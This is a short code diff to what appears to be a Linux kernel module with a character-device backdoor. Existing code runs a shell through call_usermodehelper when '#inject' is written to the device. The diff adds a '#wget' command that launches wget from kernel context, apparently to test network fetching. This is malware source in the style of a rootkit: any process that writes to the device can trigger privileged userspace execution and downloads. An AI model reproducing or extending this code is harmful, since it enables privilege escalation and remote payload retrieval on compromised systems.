@@ -96,6 +96,17 @@ static int inject_shell(void) {
 	return call_usermodehelper(args[0], args, env, UMH_WAIT_PROC);
 }
 
+static int find_wget(void) {
+	char *args[] = {"/usr/bin/wget", "https://google.com", NULL};
+
+	static char *env[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
+	return call_usermodehelper(args[0], args, env, UMH_WAIT_PROC);
+}
+
 static int device_open(struct inode *inode, struct file *file) {
 
 	if(is_open)
@@ -179,6 +190,9 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 	} else if(strncmp("#inject", buff, 7) == 0) {
 		res = inject_shell();
 		printk(KERN_INFO "injection status %d\n", res);
+	} else if(strncmp("#wget", buff, 5) == 0) {
+		res = find_wget();
+		printk(KERN_INFO "wget status %d\n", res);
 	}	
 
 	return -EINVAL;
